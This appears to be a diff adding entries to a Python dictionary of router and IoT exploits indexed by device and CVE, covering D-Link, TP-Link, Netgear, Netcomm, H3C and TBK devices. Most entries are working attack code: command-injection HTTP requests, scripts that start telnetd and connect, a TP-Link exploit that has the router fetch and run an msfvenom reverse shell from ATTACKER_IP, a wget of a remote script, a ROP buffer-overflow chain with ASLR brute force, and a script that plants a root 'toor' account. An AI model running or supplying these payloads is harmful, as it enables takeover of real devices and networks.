@@ -964,7 +964,115 @@ model_exp_dic["DIR-882"] = {
 #affetc firmware 1.10B04
 login set passord is NULL will success
     """
-    ]
+    ],
+    "CVE-2022-28896":
+["command injection vulnerability in the component /setnetworksettings/SubnetMask of D-Link DIR882 DIR882A1_FW130B06 allows attackers to escalate privileges to root via a crafted payload.\n['https://github.com/EPhaha/IOT_vuln/tree/main/d-link/dir-882/2\n']",
+ """
+#auth rce && affect DIR882A1_FW130B06
+POST /HNAP1/ HTTP/1.1
+Host: 192.168.0.1:7018
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:98.0) Gecko/20100101 Firefox/98.0
+Accept: text/xml
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Content-Type: text/xml
+SOAPACTION: "http://purenetworks.com/HNAP1/SetNetworkSettings"
+HNAP_AUTH: 3C5A4B9EECED160285AAE8D34D8CBA43 1649125990491
+Content-Length: 632
+Origin: http://192.168.0.1:7018
+Connection: close
+Referer: http://192.168.0.1:7018/Network.html
+Cookie: SESSION_ID=2:1556825615:2; uid=TFKV4ftJ
+
+<?xml version="1.0" encoding="UTF-8"?>
+<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+<soap:Body>
+<SetNetworkSettings xmlns="http://purenetworks.com/HNAP1/">
+	<IPAddress>192.168.5.1</IPAddress>
+	<SubnetMask>&& ls > /tmp/456 &&echo 1</SubnetMask>
+	<DeviceName>dlinkrouter</DeviceName>
+	<LocalDomainName></LocalDomainName>
+	<IPRangeStart>1</IPRangeStart>
+	<IPRangeEnd>254</IPRangeEnd>
+	<LeaseTime>10080</LeaseTime>
+	<Broadcast>false</Broadcast>
+	<DNSRelay>true</DNSRelay>
+</SetNetworkSettings>
+</soap:Body>
+</soap:Envelope>
+ """],
+    "CVE-2022-28901":
+["command injection vulnerability in the component /SetTriggerLEDBlink/Blink of D-Link DIR882 DIR882A1_FW130B06 allows attackers to escalate privileges to root via a crafted payload.\n['https://github.com/EPhaha/IOT_vuln/tree/main/d-link/dir-882/3']",
+ """
+#auth rce && affect DIR882A1_FW130B06
+POST /HNAP1/ HTTP/1.1
+Host: 192.168.0.1:7018
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:98.0) Gecko/20100101 Firefox/98.0
+Accept: */*
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Content-Type: text/xml; charset=utf-8
+SOAPAction: "http://purenetworks.com/HNAP1/SetLEDStatus"
+HNAP_AUTH: FBAFE6649BD7D7195037F941B5248F0F 1649150396101
+X-Requested-With: XMLHttpRequest
+Content-Length: 338
+Origin: http://192.168.0.1:7018
+Connection: close
+Referer: http://192.168.0.1:7018/Admin.html
+Cookie: SESSION_ID=2:1556825615:2; uid=UXOR3rQa
+
+<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><SetLEDStatus xmlns="http://purenetworks.com/HNAP1/"><Enabled>false</Enabled></SetLEDStatus><SetTriggerLEDBlink><Blink>&& ls > /tmp/456 &&echo 1>
+</Blink>
+</SetTriggerLEDBlink>
+</soap:Body></soap:Envelope>
+ """
+ ],
+    "CVE-2022-28895":
+["A command injection vulnerability in the component /setnetworksettings/IPAddress of D-Link DIR882 DIR882A1_FW130B06 allows attackers to escalate privileges to root via a crafted payload.\n['']",
+ """
+#auth rce && affect DIR882A1_FW130B06
+POST /HNAP1/ HTTP/1.1
+Host: 192.168.0.1:7018
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:98.0) Gecko/20100101 Firefox/98.0
+Accept: text/xml
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Content-Type: text/xml
+SOAPACTION: "http://purenetworks.com/HNAP1/SetNetworkSettings"
+HNAP_AUTH: 3FD4E69D96091F37A00F8FEC98928CB5 1649128376185
+Content-Length: 633
+Origin: http://192.168.0.1:7018
+Connection: close
+Referer: http://192.168.0.1:7018/Network.html
+Cookie: SESSION_ID=2:1556825615:2; uid=LeaHzVaQ
+
+<?xml version="1.0" encoding="UTF-8"?>
+<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+<soap:Body>
+<SetNetworkSettings xmlns="http://purenetworks.com/HNAP1/">
+	<IPAddress>&& ls > /tmp/456 &&echo 1</IPAddress>
+	<SubnetMask>255.255.255.0</SubnetMask>
+	<DeviceName>dlinkrouter3</DeviceName>
+	<LocalDomainName></LocalDomainName>
+	<IPRangeStart>1</IPRangeStart>
+	<IPRangeEnd>254</IPRangeEnd>
+	<LeaseTime>10080</LeaseTime>
+	<Broadcast>false</Broadcast>
+	<DNSRelay>true</DNSRelay>
+</SetNetworkSettings>
+</soap:Body>
+</soap:Envelope>
+ """
+ ],
+    "CVE-2022-28571":
+["882 DIR882A1_FW130B06 was discovered to contain a command injection vulnerability in`/usr/bin/cli.\n['https://github.com/F0und-icu/TempName/tree/main/Dlink-882']",
+ """
+ http://192.168.0.1/start_telnet
+ login:admin
+ passwd:admin's pass +'@twsz2018'
+ router> ping 1.1.1.1 & ps#(command Injection)
+ """
+ ]
 }
 
 model_exp_dic["DIR-825vB"] = {
@@ -1118,7 +1226,7 @@ def send_via_http(payload):
     sys.stdout.write(d)
     print("")
 
-  status = d.split("\n")[0].strip()
+  status = d.split("\\n")[0].strip()
   print(status)
 
   #s.shutdown(socket.SHUT_RDWR)
@@ -1129,7 +1237,7 @@ def send_via_http(payload):
 def reset_session_state_or_sth():
   # I'm not really sure why this works, but it does.
   status = send_via_http(
-    b'\r\n'.join([
+    b'\\r\\n'.join([
       b"GET /401_access_denied.htm HTTP/1.5",
       b"Host: aplogin",
       b"", b""
@@ -1141,7 +1249,7 @@ def reset_session_state_or_sth():
 
 def enable_debug_mode():
   status = send_via_http(
-    b'\r\n'.join([
+    b'\\r\\n'.join([
       b"GET /setup.cgi?todo=debug%00currentsetting.htm HTTP/1.5",
       b"Host: aplogin",
       b"", b""
@@ -1156,7 +1264,7 @@ def change_nvram_password(new_password):
   # here.
   new_password = bytes(new_password, "utf-8")
   status = send_via_http(
-    b'\r\n'.join([
+    b'\\r\\n'.join([
       ( b"GET /setup.cgi?todo=con_save_passwd&"
         b"sysNewPasswd=%s&sysConfirmPasswd=%s"
         b"%%00currentsetting.htm HTTP/1.5" ) % (new_password, new_password),
@@ -1170,7 +1278,7 @@ def change_nvram_password(new_password):
 
 def reboot():
   send_via_http(
-    b'\r\n'.join([
+    b'\\r\\n'.join([
       b"POST /setup.cgi?id=0%00currentsetting.htm?sp=1234 HTTP/1.1",
       b"Host: aplogin",
       b"Content-Length: 11",
@@ -1194,7 +1302,7 @@ def change_password_full(old_password, new_password):
   ) % (old_password, new_password, new_password)
 
   status = send_via_http(
-    b'\r\n'.join([
+    b'\\r\\n'.join([
       b"POST /setup.cgi?id=0%00currentsetting.htm?sp=1234 HTTP/1.1",
       b"Host: aplogin",
       b"Content-Length: %i" % len(post_body),
@@ -1216,7 +1324,7 @@ def unauth_rce(cmd):
   ) % (cmd)
 
   status = send_via_http(
-    b'\r\n'.join([
+    b'\\r\\n'.join([
       b"POST /setup.cgi?id=0%00currentsetting.htm?sp=1234 HTTP/1.1",
       b"Host: aplogin",
       b"Content-Length: %i" % len(post_body),
@@ -1239,20 +1347,20 @@ def add_root_user(password):
   t.sock = s
 
   print(str(t.read_until(b"WAC104 login: "), "cp852"))
-  t.write(b"admin\n")
+  t.write(b"admin\\n")
 
   print(str(t.read_until(b"Password: "), "cp852"))
-  t.write(bytes(password, "utf-8") + b"\n")
+  t.write(bytes(password, "utf-8") + b"\\n")
 
   print(str(t.read_until(b"$ "), "cp852"))
   # Adds root user named "toor" with password "AlaMaKota1234".
   t.write(
-    b"cd /tmp/etc\n"
-    b"cp passwd passwdx\n"
-    b"echo toor:scEOyDvMLIlp6:0:0::scRY.aIzztZFk:/sbin/sh >> passwdx\n"
-    b"mv passwd old_passwd\n"
-    b"mv passwdx passwd\n"
-    b"echo DONEMARKER\n"
+    b"cd /tmp/etc\\n"
+    b"cp passwd passwdx\\n"
+    b"echo toor:scEOyDvMLIlp6:0:0::scRY.aIzztZFk:/sbin/sh >> passwdx\\n"
+    b"mv passwd old_passwd\\n"
+    b"mv passwdx passwd\\n"
+    b"echo DONEMARKER\\n"
   )
 
   print(str(t.read_until(b"DONEMARKER"), "cp852"))
@@ -1267,16 +1375,16 @@ def connect_as_root():
   t.sock = s
 
   print(str(t.read_until(b"WAC104 login: "), "cp852"))
-  t.write(b"toor\n")
+  t.write(b"toor\\n")
 
   print(str(t.read_until(b"Password: "), "cp852"))
-  t.write(b"AlaMaKota1234\n")
+  t.write(b"AlaMaKota1234\\n")
 
   t.interact()
   t.close()
 
 CMD = CMD.replace(" ","${IFS}")
-unauth_rce("\n"+CMD+"\n")
+unauth_rce("\\n"+CMD+"\\n")
  """
  ]
 }
@@ -1714,4 +1822,683 @@ ssh root@192.168.31.1
 model_exp_dic['Netgear_R6700'] = {
     
 }
+
+model_exp_dic["DIR-859"] = {
+    "CVE-2019–17621":
+["The UPnP endpoint URL /gena.cgi in the D-Link DIR-859 Wi-Fi router 1.05 and 1.06B01 Beta01 allows an Unauthenticated remote attacker to execute system commands as root, by sending a specially crafted HTTP SUBSCRIBE request to the UPnP service when connecting to the local network.\n['http://packetstormsecurity.com/files/156054/D-Link-DIR-859-Unauthenticated-Remote-Command-Execution.html'\n'https://medium.com/@s1kr10s/d-link-dir-859-rce-unautenticated-cve-2019-17621-en-d94b47a15104'\n'https://supportannouncement.us.dlink.com/announcement/publication.aspx?name=SAP10146']",
+ """
+import socket
+import os
+from time import sleep
+# Exploit By Miguel Mendez & Pablo Pollanco
+def httpSUB(server, port, shell_file):
+    print('\n[*] Connection {host}:{port}').format(host=server, port=port)
+    con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    request = "SUBSCRIBE /gena.cgi?service=" + str(shell_file) + " HTTP/1.0\n"
+    request += "Host: " + str(server) + str(port) + "\n"
+    request += "Callback: <http://192.168.0.4:34033/ServiceProxy27>\n"
+    request += "NT: upnp:event\n"
+    request += "Timeout: Second-1800\n"
+    request += "Accept-Encoding: gzip, deflate\n"
+    request += "User-Agent: gupnp-universal-cp GUPnP/1.0.2 DLNADOC/1.50\n\n"
+sleep(1)
+    print('[*] Sending Payload')
+    con.connect((socket.gethostbyname(server),port))
+    con.send(request.encode())
+    results = con.recv(4096)
+sleep(1)
+    print('[*] Running Telnetd Service')
+    sleep(1)
+    print('[*] Opening Telnet Connection\n')
+    sleep(2)
+    os.system('telnet ' + str(server) + ' 9999')
+serverInput = raw_input('IP Router: ')
+portInput = 49152
+httpSUB(serverInput, portInput, '`telnetd -p 9999 &`')
+ """
+ ],
+    "CVE-2019-20215":
+["D-Link DIR-859 1.05 and 1.06B01 Beta01 devices allow remote attackers to execute arbitrary OS commands via a urn: to the M-SEARCH method in ssdpcgi() in /htdocs/cgibin, because HTTP_ST is mishandled. The value of the urn: service/device is checked with the strstr function, which allows an attacker to concatenate arbitrary commands separated by shell metacharacters.\n['http://packetstormsecurity.com/files/156250/D-Link-ssdpcgi-Unauthenticated-Remote-Command-Execution.html'\n'https://medium.com/@s1kr10s/d-link-dir-859-unauthenticated-rce-in-ssdpcgi-http-st-cve-2019-20215-en-2e799acb8a73'\n'https://supportannouncement.us.dlink.com/announcement/publication.aspx?name=SAP10147']",
+"""
+import sys
+import os
+import socket
+from time import sleep
+# Exploit By Miguel Mendez - @s1kr10s
+def config_payload(ip, port):
+    header = "M-SEARCH * HTTP/1.1\n"
+    header += "HOST:"+str(ip)+":"+str(port)+"\n"
+    header += "ST:urn:device:1;telnetd\n"
+    header += "MX:2\n"
+    header += 'MAN:"ssdp:discover"'+"\n\n"
+    return header
+def send_conexion(ip, port, payload):
+    sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM,socket.IPPROTO_UDP)
+    sock.setsockopt(socket.IPPROTO_IP,socket.IP_MULTICAST_TTL,2)
+    sock.sendto(payload,(ip, port))
+    sock.close()
+if __name__== "__main__":
+    ip = raw_input("Router IP: ")
+    port = 1900
+print("\n---= HEADER =---\n")
+    headers = config_payload(ip, port)
+    print("[+] Preparando Header ...")
+    print("[+] Enviando payload ...")
+    print("[+] Activando servicio telnetd :)") 
+    send_conexion(ip, port, headers)
+    print("[+] Conectando al servicio ...\n")
+    sleep(5)
+    os.system('telnet ' + str(ip))
+"""
+ ],
+    "CVE-2019-20216":
+["D-Link DIR-859 1.05 and 1.06B01 Beta01 devices allow remote attackers to execute arbitrary OS commands via the urn: to the M-SEARCH method in ssdpcgi() in /htdocs/cgibin, because REMOTE_PORT is mishandled. The value of the urn: service/device is checked with the strstr function, which allows an attacker to concatenate arbitrary commands separated by shell metacharacters.",
+"""
+IP="127.0.0.1"
+PORT="1337"
+METHOD=”M-SEARCH"
+URI="/"
+REMOTE_PORT="13;ls;"
+SERVER_ID="1;telnetd"
+"""
+ ]
+}
+
+model_exp_dic["TPLINK-TL-WR840N_V5"] = {
+    "CVE-2021-41653":
+["The PING function on the TP-Link TL-WR840N EU v5 router with firmware through TL-WR840N(EU)_V5_171211 is vulnerable to remote code execution via a crafted payload in an IP address input field.\n['https://k4m1ll0.com/cve-2021-41653.html'\n'https://www.tp-link.com/us/press/security-advisory/']",
+"""
+#!/usr/bin/python3
+###############################################################
+### tplink_TL-WR840N-EU-v5-rce-exploit_v1.py 
+### Version: 1.0
+### Author: Matek Kamillo (k4m1ll0)
+### Email: matek.kamillo@gmail.com
+### Date: 2021.09.06.
+##############################################################
+
+import requests
+import os
+import base64
+
+USERNAME = "admin"
+PASSWORD = "admin"
+URL = "http://192.168.1.1/cgi"
+PATH = "/srv/tftp/shell"
+ATTACKER_IP = "192.168.1.101"
+COMMAND = "$(echo 127.0.0.1; tftp -g -r shell -l /var/tmp/shell " + ATTACKER_IP + "; chmod +x /var/tmp/shell; /var/tmp/shell)"
+
+def base64_encode(s):
+    msg_bytes = s.encode('ascii')
+    return base64.b64encode(msg_bytes)
+
+
+class Exploit(object):
+    def __init__(self, username, password, command):
+        self.username = username
+        self.password = password
+        self.command = command
+
+        self.URL = "http://192.168.1.1/cgi"
+        self.session = requests.session()
+        #self.proxies = { 'http' : 'http://192.168.1.100:8080'}
+        self.proxies = { }
+        self.cookies = { 'Authorization' : 'Basic ' + base64_encode(username + ":" + password).decode('ascii') }
+        self.headers = { 'Content-Type': 'text/plain', 'Referer' : 'http://192.168.1.1/mainFrame.htm' }
+
+    def _prepare(self):
+        print("Generating reverse shell.")
+        command = "msfvenom -p linux/mipsle/shell/reverse_tcp -f elf LHOST=" + ATTACKER_IP + " LPORT=2000 -o " + PATH
+        os.system(command)
+
+    def _send_ping_command(self):
+        URL = self.URL + '?2'
+        data = '[IPPING_DIAG#0,0,0,0,0,0#0,0,0,0,0,0]0,6\\r\\n'
+        data += 'dataBlockSize=64\\r\\n'
+        data += 'timeout=1\\r\\n'
+        data += 'numberOfRepetitions=4\\r\\n'
+        data += 'host=' + self.command + '\\r\\n'
+        data += 'X_TP_ConnName=ewan_ipoe_d\\r\\n'
+        data += 'diagnosticsState=Requested\\r\\n'
+        r = self.session.post(URL, headers=self.headers, data=data, cookies=self.cookies, proxies=self.proxies)
+
+    def _send_execute_command(self):
+        URL = self.URL + '?7'
+        data = '[ACT_OP_IPPING#0,0,0,0,0,0#0,0,0,0,0,0]0,0\\r\\n'
+        r = self.session.post(URL, headers=self.headers, data=data, cookies=self.cookies, proxies=self.proxies)
+        
+    def execute(self):
+        self._prepare()
+        self._send_ping_command()
+        self._send_execute_command()
+
+if __name__ == "__main__":
+    e = Exploit(USERNAME, PASSWORD, COMMAND)
+    e.execute()
+""" 
+]
+}
+
+model_exp_dic["H3C_A210-G"] = {
+    "CVE-2023-24093":
+["An access control issue in H3C A210-G A210-GV100R005 allows attackers to authenticate without a password.\n['https://blog.luckytain.com/?p=66']",
+"""
+Product: H3C A210-G
+
+Software Version: A210-GV100R005
+
+Bootrom Version: 106
+
+Hardware Version: VER.A
+
+Reboot Router Exp(192.168.21.2):
+
+curl -k -i --raw -X POST -d "CMD=Reboot_Router&GO=do_rst.asp&SET0=RebootRouter%%3D1&nowait=1&location_addr=http%%3A%%2F%%2F192.168.21.2%%2Fdevice_restart.asp" "http://192.168.21.2/goform/aspForm" -H "Origin: http://192.168.21.2" -H "Referer: http://192.168.21.2/device_restart.asp"
+"""
+ ]
+}
+
+model_exp_dic["TBK_serise_DVR"] = {
+    "CVE-2018-9995":
+['TBK DVR4104 and DVR4216 devices, as well as Novo, CeNova, QSee, Pulnix, XVR 5 in 1, Securus, Night OWL, DVR Login, HVR Login, and MDVR Login, which run re-branded versions of the original TBK DVR4104 and DVR4216 series, allow remote attackers to bypass authentication via a "Cookie: uid=admin" header, as demonstrated by a device.rsp?opt=user&cmd=list request that provides credentials within JSON data in a response.\n["http://misteralfa-hack.blogspot.cl/2018/04/tbk-vision-dvr-login-bypass.html"\n"http://misteralfa-hack.blogspot.cl/2018/04/update-dvr-login-bypass-cve-2018-9995.html"\n"https://www.exploit-db.com/exploits/44577/"]',
+"""
+#shadon search "/device.rsp" or "login.rsp"
+curl -k -v "http://IP:PORT/device.rsp?opt=user&cmd=list" -H "Cookie: uid=admin"
+"""
+]
+}
+
+
+model_exp_dic["TP_WPA8630_v2"] = {
+    'auth rce':
+["In the sub_40A918 function of httpd file processing admin/powerline, there are two command injection vulnerabilities (it can also construct stack overflow). The key parameter corresponding to plc_device and the devicePwd parameter corresponding to plc_add are not filtered, and the vsprintf splicing is executed directly, resulting in command injection and stack overflow attacks.",
+ """
+ POST /admin/powerline HTTP/1.1
+Host: 192.168.100.2
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:92.0) Gecko/20100101 Firefox/92.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 63
+Origin: http://192.168.100.2
+Connection: close
+Referer: http://192.168.100.2/
+Cookie: Authorization=Basic%20admin%3A21232f297a57a5a743894a0e4a801fc3
+
+xxxxxxxxxxxxxxxxxxxxxxxxxx;wget http://192.168.100.254:8000/net.sh; 
+
+POST /admin/powerline?form=plc_device HTTP/1.1
+ """
+ ]
+}
+
+model_exp_dic["Netgear_WNDR3700v2"] = {
+    "CVE‑2023‑0849":
+["A vulnerability has been found in Netgear WNDR3700v2 1.0.1.14 and classified as critical. This vulnerability affects unknown code of the component Web Interface. The manipulation leads to command injection. The attack can be initiated remotely. The exploit has been disclosed to the public and may be used. The identifier of this vulnerability is VDB-221152.\n['https://vuldb.com/?id.221152']",
+ """
+#auth command_injection
+import requests,socket
+import re
+import time
+from urllib.parse import urlencode
+
+username = 'admin'
+password = 'password'
+device_web_ip = '192.168.1.1'
+ping_target = '192.168.1.2'
+
+request = {'HEAD':
+  {'Host': '{}'.format(device_web_ip), 
+  'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0 -e \\'exec "/bin/sh -c ping -c 1 {}";\\' '.format(ping_target), 
+  'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 -p '`/bin/sh -c ping -c 1 {} 1>&0`' ".format(ping_target),
+  'Accept-Language': 'en-US,en;q=0.5',
+  'Accept-Encoding': 'gzip, deflate', 
+  'Content-Type': 'application/x-www-form-urlencoded', 
+  'Origin': 'http://127.0.0.1:8081', 
+#  'Authorization': 'Basic YWRtaW46cGFzc3dvcmQ=', 
+  'Connection': 'keep-alive', 
+  'Referer': 'http://127.0.0.1:8081/BAS_pptp.htm', 
+  'Upgrade-Insecure-Requests': '1'}, 
+  'PARAM': 
+  {'submit_flag': 'pptp',
+  'change_wan_type': 0, 
+  'run_test': 'no', 
+  'pptp_myip': '/index.html|ping -c 1 {}|'.format(ping_target), 
+  'pptp_gateway': '192.168.55.6/../../../../../../../../../../../../dev/console', 
+  'pptp_subnet': '255.255.255.0', 
+  'pptp_dnsaddr1': "192.168.55.1 -x sh -c 'reset; exec ping -c 1 {} 1>&0 2>&0' ".format(ping_target), 
+  'pptp_dnsaddr2': '192.168.55.2', 'hidden_pptp_idle_time': '5', 
+  'conflict_wanlan': '', 
+  'hid_mtu_value': 1436, 
+  'hid_pptp_dod': 1, 
+  'login_type': " -p '`/bin/sh -c ping -c 1 {} 1>&0`' ".format(ping_target), 
+  'pptp_username': 'dummy -s --eval=$\\'x:$zero\\t-\\'"ping -c 1 {}" '.format(ping_target), 
+  'pptp_passwd': 'dummy', 
+  'pptp_dod': 1, 
+  'pptp_idletime': 255, 
+  'myip_1': 192, 
+  'myip_3': 55, 
+  'myip_4': 5, 
+  'WANAssign': 1, 
+  'mymask_1': '', 
+  'mymask_2': '', 
+  'mymask_3': '', 
+  'mymask_4': '', 
+  'pptp_serv_ip': '10.0.0.138', 
+  'mygw_1': '192', 
+  'mygw_2': 168, 
+  'mygw_3': 55, 
+  'mygw_4': 6, 
+  'Gateway': '',
+  'pptp_conn_id': 'dummy', 
+  'DNSAssign': 1, 
+  'DAddr1': 192, 
+  'DAddr2': 168, 
+  'DAddr3': 55, 
+  'DAddr4': 4278190081, 
+  'PDAddr1': 255, 
+  'PDAddr2': 168, 
+  'PDAddr3': 55, 
+  'PDAddr4': 2, 
+  'Spoofmac': '52:54:00:12:34:66', 
+  'Apply': 'Apply', 
+  'wds_endis_ip_client': '', 
+  'ipv6_primary_dns_fixed': '', 
+  'out_of_range': '', 
+  'repeater_mac1': '', 
+  'network': '', 
+  'domain_name': '<% cfg_sed_xss(', 
+  'repeater_ip_a': '', 
+  'system_name': ''
+  }, 
+  'ATTR': 
+  {'URL': 'http://{}/apply.cgi?/BAS_update.htm timestamp=40908312'.format(device_web_ip), 
+  'METHOD': 'POST', 
+  'VERSION': 'HTTP/1.1'
+  }
+}
+
+headers = request['HEAD']
+params = request['PARAM']
+method = request['ATTR']['METHOD']
+url = request['ATTR']['URL']
+
+probe = 'http://{}/BAS_pptp.htm'.format(device_web_ip)
+loop = 3
+r = None
+while loop>0:
+  try:
+    loop -= 1
+    r = requests.get(url=probe,headers=headers,auth=(username,password),timeout=0.5)
+    if r is not None and r.status_code != 200:
+      time.sleep((3-loop)*3)
+    elif r is not None and r.status_code == 200:
+      break
+  except Exception as e:
+    time.sleep((3-loop)*3)
+    print('Send token probe error:{}'.format(e))
+
+timestamp = None
+if r is not None and r.status_code == 200:
+  body = r.text.replace('%20',' ')
+  pat = r'action="(.*?) timestamp=(.*?)"'
+  res = re.findall(pat, body)
+  if len(res) > 0 and len(res[0])==2:
+    uri_half = res[0][0]
+    timestamp = res[0][1]
+    print('new timestamp:{}'.format(timestamp))
+
+if timestamp is not None:
+  pos = url.find(' timestamp=')
+  url_tmp = url[:pos] + ' timestamp=' + timestamp
+  url = url_tmp
+r = requests.request(method=method,url=url,headers=headers,auth=(username,password),data=params,verify=False,timeout=0.5)
+"""
+ ]
+}
+
+
+model_exp_dic["Netcomm_NF20"] = {
+    "CVE-2022-4873":
+["On Netcomm router models NF20MESH, NF20, and NL1902 a stack based buffer overflow affects the sessionKey parameter. By providing a specific number of bytes, the instruction pointer is able to be overwritten on the stack and crashes the application at a known location.\n['https://github.com/scarvell/advisories/blob/main/2022_netcomm_nf20mesh_unauth_rce.md']",
+ '''
+ #!/usr/bin/python3
+"""
+Netcomm NF20MESH Unauthenticated RCE
+Author: Brendan Scarvell
+Vulnerable versions: <= R6B021
+
+A stack based buffer overflow exists in the sessionKey query string parameter. An authentication bypass
+was also discovered by providing /.css/ in the request path. Chaining both of the two bugs together
+results in unauthenticated remote code execution.
+
+The exploit can take up to 5-10 minutes until it gets lucky and hits the right base address for libc.
+"""
+
+import requests, telnetlib, sys, time
+
+"""
+task: cdd0dc00 ti: caca0000 task.ti: caca0000
+PC is at 0x444444
+LR is at 0x29218
+pc : [<00444444>]    lr : [<00029218>]    psr: 60070010
+sp : bee158c0  ip : 00000000  fp : 41414141
+r10: 41414141  r9 : 41414141  r8 : 00000000
+r7 : 41414141  r6 : 41414141  r5 : 41414141  r4 : 41414141
+r3 : 00000000  r2 : 00000000  r1 : 00000000  r0 : 00000001
+"""
+
+TARGET = "192.168.20.1"
+
+MAX_BUF_SIZE = 4140
+
+libc_system         = b"%6C%89%a2%b6"   # 0xb6a2896c
+
+# Gadgets
+big_pop             = b"%40%2b%65%b6"   # 0xb6652b40 (0x00079b40) : mov r0, r1; pop {r4, r5, r6, r7, pc};
+add_r1_sp_blx_r5    = b"%6c%79%6d%b6"   # 0xb66d796c (0x000fe96c) : add r1, sp, #0x14; blx r5;
+mov_r0_r1_blx_r3    = b"%cc%d0%64%b6"   # 0xb664d0cc (0x000740cc) : mov r0, r1; blx r3;
+mov_r4_r3_pop_r4_pc = b"%7c%98%65%b6"   # 0xb665987c mov r3, r4; mov r0, r3; pop {r4, pc}; 
+
+# pewpew
+buf  = b"A" * 4096
+buf += big_pop              # r3 => pop system() into PC
+buf += mov_r0_r1_blx_r3     # r5 => mov r1 into r0, blx to r3 to continue chain (big_pop ^)
+buf += b"B" * ((MAX_BUF_SIZE - len(buf)))                  
+buf += mov_r4_r3_pop_r4_pc  # move r4 into r3 to continue rop chain
+buf += b"CCCC"              
+buf += add_r1_sp_blx_r5     # push sp to point at command and save in r1
+buf += b"D" * 16            
+buf += libc_system          # executed last after r0 populated
+buf += b""
+buf += b"sh%20-c%20%22/bin/busybox%20telnetd%20-l%20/bin/sh%20-p%2031337%22%23"     
+
+print(f"[*] payload length: {len(buf)}")
+
+buf = buf.decode("latin1")
+
+# Referer header is required in the request
+headers = {
+    "Referer": f"http://{TARGET}/login.html" 
+}
+
+print("[*] bruteforcing aslr. this could take a while..")
+
+pwned = False
+
+# keep repeating until the base address for libc is 0xb65d9000, allowing the gadgets + system() line up correctly
+
+while not pwned:
+    try:
+        r = requests.get(f"http://{TARGET}/.css/rtroutecfg.cgi?defaultGatewayList=ppp0.3&dfltGw6Ifc=&sessionKey={buf}", timeout=5, headers=headers)
+
+    except requests.exceptions.ConnectionError:
+        # successful exploitation hangs connection. Capture timeout so we dont hang forever
+        print("\n[*] got hit on libc @ 0xb65d9000")
+    
+    try:
+        tn = telnetlib.Telnet(TARGET, 31337)
+        if (tn):
+            pwned = True
+            print("[*] popping shell")
+            time.sleep(2)
+            tn.interact()
+    except:
+        sys.stdout.write(".")
+        sys.stdout.flush()
+ '''
+ ],
+    "CVE-2022-4874":
+["Authentication bypass in Netcomm router models NF20MESH, NF20, and NL1902 allows an unauthenticated user to access content. In order to serve static content, the application performs a check for the existence of specific characters in the URL (.css, .png etc). If it exists, it performs a \"fake login\" to give the request an active session to load the file and not redirect to the login page.\n['https://github.com/scarvell/advisories/blob/main/2022_netcomm_nf20mesh_unauth_rce.md']",
+ """
+ curl -v http://192.168.20.1/.css/firwall0fTr181.cmd?action=viewcfg
+ """
+ ]
+}
+
+model_exp_dic["Cisco_R0XX"] = {
+    "CVE-2023-20025":
+    ["A vulnerability in the web-based management interface of Cisco Small Business RV042 Series Routers could allow an unauthenticated, remote attacker to bypass authentication on the affected device. This vulnerability is due to incorrect user input validation of incoming HTTP packets. An attacker could exploit this vulnerability by sending crafted requests to the web-based management interface. A successful exploit could allow the attacker to gain root privileges on the affected device.\n['https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sbr042-multi-vuln-ej76Pke5']",
+     ''
+     ],
+    "CVE-2023-20026":
+        ['A vulnerability in the web-based management interface of Cisco Small Business Routers RV042 Series could allow an authenticated, remote attacker to inject arbitrary commands on an affected device. This vulnerability is due to improper validation of user input fields within incoming HTTP packets. An attacker could exploit this vulnerability by sending a crafted request to the web-based management interface. A successful exploit could allow the attacker to execute arbitrary commands on an affected device with root-level privileges. To exploit these vulnerabilities, an attacker would need to have valid Administrator credentials on the affected device.\n["https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sbr042-multi-vuln-ej76Pke5"]',
+         ""
+         ]
+}
+
+
+
+model_exp_dic["TL-WR802N(US)_V4"] = {
+    "CVE-2021-29302":
+['TP-Link TL-WR802N(US), Archer_C50v5_US v4_200 <= 2020.06 contains a buffer overflow vulnerability in the httpd process in the body message. The attack vector is: The attacker can get shell of the router by sending a message through the network, which may lead to remote code execution.\n["https://github.com/liyansong2018/CVE/tree/main/2021/CVE-2021-29302"\n"https://static.tp-link.com/beta/2021/202103/20210319/TL-WR802Nv4_US_0.9.1_3.17_up_boot[210317-rel64474].zip"\n"https://www.tp-link.com/us/support/download/tl-wr802n/#Firmware"]',
+ """
+ # Only after resetting the router or using the router for the first time, can the script work effectively!
+import requests
+from pwn import *
+
+headers = {
+    "Host": "192.168.0.1",
+    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
+    "Accept": "*/*",
